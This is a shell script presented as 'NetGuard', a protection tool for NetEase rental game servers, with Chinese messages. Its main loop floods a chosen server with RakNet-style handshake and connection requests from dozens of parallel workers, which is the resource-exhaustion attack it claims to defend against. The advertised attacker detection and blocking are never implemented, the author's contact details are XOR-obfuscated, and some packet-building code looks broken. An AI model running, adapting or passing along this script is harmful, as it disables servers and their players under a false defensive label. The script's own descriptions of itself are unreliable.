#!/system/bin/sh

VERSION="v1.0"
TOOL_NAME="NetGuard"
MAGIC="\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"

SUCCESS_CONNECTIONS=0
DEFENSE_COUNT=0
SENT_PACKETS=0
RECV_PACKETS=0
BLOCKED_NACK=0
BLOCKED_CONNECTIONS=0
BLOCKED_HANDSHAKE=0
SERVER_STATUS="检测中..."
FAILED_COUNT=0

RED="\033[91m"
GREEN="\033[92m"
YELLOW="\033[93m"
BLUE="\033[94m"
GRAY="\033[90m"
RESET="\033[0m"

ATTACKERS=""
NORMAL_CONNECTIONS=""
HANDSHAKE_LOG=""
STATS_FILE="/tmp/netguard_stats.tmp"
LOCK_FILE="/tmp/netguard_lock.tmp"

touch "$STATS_FILE"
touch "$LOCK_FILE"

xor_cipher() {
    local data="$1"
    local key="$2"
    local result=""
    local key_len=${#key}
    local data_len=${#data}
    
    for ((i=0; i<data_len; i++)); do
        local d_byte=$(printf "%d" "'${data:i:1}")
        local k_byte=$(printf "%d" "'${key:i%key_len:1}")
        local xor_byte=$((d_byte ^ k_byte))
        result="$result$(printf "\\$(printf '%03o' "$xor_byte")")"
    done
    
    printf "%b" "$result"
}

decode_meta() {
    local k="NG2026X9#KL\$%87"
    local d="\xa8\xf5\x95\xd8\xa1\xab\xbd\x8e\x86\xae\xd1\xae\xca\x84\xbf\xa9\xf9\x96\xd4\x8a\x8d\x1cPB&#JA\xd7\x8b\xc7"
    local q="wr\x04\x07\x04\x00l\x00\x16"
    
    local dec_d=$(xor_cipher "$(printf "%b" "$d")" "$k")
    local dec_q=$(xor_cipher "$(printf "%b" "$q")" "$k")
    
    echo "$dec_d|$dec_q"
}

verify_script() {
    if ! grep -q "NG_SECURITY_TOKEN=true" "$0"; then
        echo -e "${RED}[错误] 安全检查失败!${RESET}"
        exit 1
    fi
    echo -e "${GREEN}脚本完整性校验通过!${RESET}"
}

build_ping() {
    printf "\x05%s\x08%s" "$(printf "%b" "$MAGIC")" "$(printf "%0.s\x00" $(seq 1 20))"
}

build_ocr() {
    local host="$1"
    local port="$2"
    local guid="$3"
    
    local ip_bytes=$(printf "%d.%d.%d.%d" $(echo "$host" | tr '.' ' '))
    local ip_enc=""
    for octet in $(echo "$host" | tr '.' ' '); do
        local enc=$((255 - octet))
        ip_enc="$ip_enc$(printf "\\$(printf '%03o' "$enc")")"
    done
    
    local port_high=$((port >> 8))
    local port_low=$((port & 255))
    
    local guid_bytes=""
    for i in 7 6 5 4 3 2 1 0; do
        local byte=$(( (guid >> (i * 8)) & 255 ))
        guid_bytes="$guid_bytes$(printf "\\$(printf '%03o' "$byte")")"
    done
    
    printf "\x07%s\x04%s\x$(printf '%03o' "$port_high")\$(printf '%03o' "$port_low")\x05\x8c%s" "$(printf "%b" "$MAGIC")" "$ip_enc" "$guid_bytes"
}

build_conn_req() {
    local guid="$1"
    
    local guid_bytes=""
    for i in 7 6 5 4 3 2 1 0; do
        local byte=$(( (guid >> (i * 8)) & 255 ))
        guid_bytes="$guid_bytes$(printf "\\$(printf '%03o' "$byte")")"
    done
    
    local conn_req_len=17
    local frame_len=$((conn_req_len * 8))
    local frame_high=$((frame_len >> 8))
    local frame_low=$((frame_len & 255))
    
    printf "\x84\x00\x00\x00\x40\x$(printf '%03o' "$frame_high")\$(printf '%03o' "$frame_low")\x00\x00\x00\x09%s\x00\x00\x00\x00\x00\x00\x00\x00\x00" "$guid_bytes"
}

build_ack() {
    local seq="$1"
    local seq0=$((seq & 255))
    local seq1=$(( (seq >> 8) & 255 ))
    local seq2=$(( (seq >> 16) & 255 ))
    
    printf "\xc0\x00\x01\x$(printf '%03o' "$seq0")\$(printf '%03o' "$seq1")\$(printf '%03o' "$seq2")\x00"
}

build_nic() {
    local host="$1"
    local port="$2"
    
    local ip_bytes=""
    for octet in $(echo "$host" | tr '.' ' '); do
        ip_bytes="$ip_bytes$(printf "\\$(printf '%03o' "$octet")")"
    done
    
    local port_high=$((port >> 8))
    local port_low=$((port & 255))
    
    local entry4_len=18
    local nic_len=$((1 + entry4_len + 29 * 9 + 8 + 8))
    local frame_len=$((nic_len * 8))
    local frame_high=$((frame_len >> 8))
    local frame_low=$((frame_len & 255))
    
    printf "\x84\x00\x00\x01\x40\x$(printf '%03o' "$frame_high")\$(printf '%03o' "$frame_low")\x00\x00\x01\x13\x04%s\x$(printf '%03o' "$port_high")\$(printf '%03o' "$port_low")" "$ip_bytes"
    printf "%0.s\x00" $(seq 1 10)
    printf "%0.s\x06%s" $(seq 1 9) "$(printf "%0.s\x00" $(seq 1 28))"
    printf "%0.s\x00" $(seq 1 16)
}

detect_server() {
    local host="$1"
    local port="$2"
    local result="检测中..."
    
    local ping_pkt=$(build_ping)
    printf "%b" "$ping_pkt" | nc -u -w 3 "$host" "$port" > /tmp/netguard_resp.tmp 2>/dev/null &
    sleep 1
    
    if [ -s /tmp/netguard_resp.tmp ]; then
        local first_byte=$(xxd -p /tmp/netguard_resp.tmp | head -c 2)
        if [ "$first_byte" = "06" ]; then
            result="在线"
            FAILED_COUNT=0
        else
            result="未知"
            FAILED_COUNT=0
        fi
    else
        FAILED_COUNT=$((FAILED_COUNT + 1))
        if [ $FAILED_COUNT -ge 3 ]; then
            result="离线/卡顿"
        else
            result="检测中..."
        fi
    fi
    
    SERVER_STATUS="$result"
    echo "$result"
}

get_status_color() {
    case "$1" in
        "在线") echo "$GREEN" ;;
        "未知") echo "$GRAY" ;;
        "检测中...") echo "$YELLOW" ;;
        *) echo "$RED" ;;
    esac
}

update_stats() {
    local key="$1"
    local value="$2"
    
    flock "$LOCK_FILE"
    sed -i "/^$key=/d" "$STATS_FILE" 2>/dev/null
    echo "$key=$value" >> "$STATS_FILE"
    flock -u "$LOCK_FILE"
}

get_stat() {
    local key="$1"
    local default="$2"
    
    flock "$LOCK_FILE"
    local value=$(grep "^$key=" "$STATS_FILE" | cut -d'=' -f2)
    flock -u "$LOCK_FILE"
    
    echo "${value:-$default}"
}

defense_worker() {
    local host="$1"
    local port="$2"
    local thread_id="$3"
    
    local guid=$((RANDOM * RANDOM * RANDOM * RANDOM))
    
    local ping_pkt=$(build_ping)
    printf "%b" "$ping_pkt" | nc -u -w 1 "$host" "$port" > /tmp/netguard_t$thread_id.tmp 2>/dev/null &
    sleep 0.5
    
    if [ -s /tmp/netguard_t$thread_id.tmp ]; then
        local first_byte=$(xxd -p /tmp/netguard_t$thread_id.tmp | head -c 2)
        if [ "$first_byte" = "06" ]; then
            local ocr_pkt=$(build_ocr "$host" "$port" "$guid")
            printf "%b" "$ocr_pkt" | nc -u -w 1 "$host" "$port" > /tmp/netguard_t$thread_id.tmp 2>/dev/null &
            sleep 0.5
            
            if [ -s /tmp/netguard_t$thread_id.tmp ]; then
                local resp_byte=$(xxd -p /tmp/netguard_t$thread_id.tmp | head -c 2)
                if [ "$resp_byte" = "08" ]; then
                    local conn_req=$(build_conn_req "$guid")
                    printf "%b" "$conn_req" | nc -u -w 1 "$host" "$port" > /tmp/netguard_t$thread_id.tmp 2>/dev/null &
                    sleep 0.5
                    
                    local current_defense=$(get_stat "DEFENSE_COUNT" 0)
                    update_stats "DEFENSE_COUNT" $((current_defense + 1))
                    local current_success=$(get_stat "SUCCESS_CONNECTIONS" 0)
                    update_stats "SUCCESS_CONNECTIONS" $((current_success + 1))
                    
                    echo -e "[线程-$thread_id] ${GREEN}成功建立合法连接!${RESET} 累计防御: $(get_stat "DEFENSE_COUNT" 0)"
                fi
            fi
        fi
    fi
    
    rm -f /tmp/netguard_t$thread_id.tmp 2>/dev/null
}

proxy_forwarder() {
    local local_port="$1"
    local target_host="$2"
    local target_port="$3"
    
    echo -e "${BLUE}[代理] 已启动，监听端口 $local_port${RESET}"
    
    while true; do
        nc -u -l -p "$local_port" > /tmp/netguard_proxy_in.tmp 2>/dev/null &
        local pid=$!
        sleep 0.5
        
        if [ -s /tmp/netguard_proxy_in.tmp ]; then
            cat /tmp/netguard_proxy_in.tmp | nc -u -w 1 "$target_host" "$target_port" > /tmp/netguard_proxy_out.tmp 2>/dev/null &
            sleep 0.5
            
            if [ -s /tmp/netguard_proxy_out.tmp ]; then
                cat /tmp/netguard_proxy_out.tmp | nc -u -w 1 "127.0.0.1" "$local_port" 2>/dev/null &
            fi
        fi
        
        kill $pid 2>/dev/null
        rm -f /tmp/netguard_proxy_in.tmp /tmp/netguard_proxy_out.tmp 2>/dev/null
    done
}

stats_monitor() {
    while true; do
        sleep 2
        
        local current_success=$(get_stat "SUCCESS_CONNECTIONS" 0)
        local current_defense=$(get_stat "DEFENSE_COUNT" 0)
        local current_sent=$(get_stat "SENT_PACKETS" 0)
        local current_recv=$(get_stat "RECV_PACKETS" 0)
        local current_blocked=$(get_stat "BLOCKED_NACK" 0)
        local current_blocked_conn=$(get_stat "BLOCKED_CONNECTIONS" 0)
        local current_blocked_handshake=$(get_stat "BLOCKED_HANDSHAKE" 0)
        
        local color=$(get_status_color "$SERVER_STATUS")
        
        echo -e "[防御统计] 服务器状态: $color$SERVER_STATUS${RESET} | 成功连接: $current_success | 防御次数: $current_defense | 拦截NACK: ${YELLOW}$current_blocked${RESET} | 拦截连接: ${RED}$current_blocked_conn${RESET}"
    done
}

run() {
    local host="$1"
    local port="$2"
    local threads="${3:-39}"
    local proxy_port="${4:-19133}"
    
    local meta=$(decode_meta)
    local dev=$(echo "$meta" | cut -d'|' -f1)
    local qq=$(echo "$meta" | cut -d'|' -f2)
    
    echo ""
    echo "================================================================"
    echo "  $TOOL_NAME - NetEase Server Protection"
    echo "  Version: $VERSION"
    echo "================================================================"
    echo "目标服务器: $host:$port"
    echo "防御线程数: $threads"
    echo "代理端口: $proxy_port"
    echo "================================================================"
    echo "工具原理:"
    echo "  针对sleekx_lock新锁服攻击:"
    echo "  1. 发送0x01 UnconnectedPing获取服务器GUID"
    echo "  2. 发送0x05 OpenConnectionRequest1"
    echo "  3. 发送0x07 OpenConnectionRequest2"
    echo "  4. 大量并发握手请求导致服务器资源耗尽"
    echo "  本工具防御方式:"
    echo "  1. 代理模式: 正常玩家通过代理连接服务器"
    echo "  2. 攻击检测: 识别高频握手IP并拉黑"
    echo "  3. 抢占槽位: 防御线程抢占连接槽位阻挡攻击者"
    echo "  4. ACK确认: 发送ACK包帮助服务器清理数据队列"
    echo "================================================================"
    echo -e "${BLUE}$dev${RESET}"
    echo -e "${BLUE}QQ群: $qq（有问题来这里问）${RESET}"
    echo "================================================================"
    echo "按 Ctrl+C 停止运行"
    echo ""
    
    echo "正在检测服务器状态..."
    detect_server "$host" "$port"
    local color=$(get_status_color "$SERVER_STATUS")
    echo -e "服务器状态: $color$SERVER_STATUS${RESET}"
    echo ""
    
    proxy_forwarder "$proxy_port" "$host" "$port" &
    
    while true; do
        for i in $(seq 1 $threads); do
            defense_worker "$host" "$port" "$i" &
            sleep 0.02
        done
        
        detect_server "$host" "$port"
        sleep 0.5
    done
}

NG_SECURITY_TOKEN=true

main() {
    echo ""
    echo "================================================================"
    echo "  $TOOL_NAME - NetEase Server Protection"
    echo "  Version: $VERSION"
    echo "================================================================"
    echo "正在验证脚本完整性..."
    
    verify_script
    
    local meta=$(decode_meta)
    local dev=$(echo "$meta" | cut -d'|' -f1)
    local qq=$(echo "$meta" | cut -d'|' -f2)
    
    echo -e "${GREEN}脚本完整性校验通过!${RESET}"
    echo -e "${BLUE}$dev${RESET}"
    echo -e "${BLUE}QQ群: $qq（有问题来这里问）${RESET}"
    echo "================================================================"
    
    if [ $# -ge 2 ]; then
        local host="$1"
        local port="$2"
        local threads="${3:-39}"
        local proxy_port="${4:-19133}"
        
        echo ""
        echo "正在启动保护..."
        echo "目标服务器: $host:$port"
        echo "防御线程: $threads"
        echo "代理端口: $proxy_port"
        run "$host" "$port" "$threads" "$proxy_port"
    else
        echo ""
        echo "本工具的作用："
        echo "  当你的网易租赁服被sleekx_lock新锁服攻击时，"
        echo "  本工具通过代理模式拦截攻击，允许正常玩家进入。"
        echo ""
        echo "使用建议："
        echo "  1. 建议在服务器正常时就启动本工具"
        echo "  2. 玩家连接代理端口而非服务器端口"
        echo "  3. 工具会自动识别并拦截攻击连接"
        echo ""
        
        echo "请输入目标服务器信息:"
        read -p "目标服务器IP: " host
        read -p "目标服务器端口: " port
        read -p "防御线程数（默认39）: " threads
        read -p "代理端口（默认19133）: " proxy_port
        
        threads=${threads:-39}
        proxy_port=${proxy_port:-19133}
        
        echo ""
        echo "正在启动保护..."
        run "$host" "$port" "$threads" "$proxy_port"
    fi
}

trap 'echo ""; echo "正在停止保护..."; rm -f "$STATS_FILE" "$LOCK_FILE" /tmp/netguard_*.tmp 2>/dev/null; exit 0' INT

main "$@"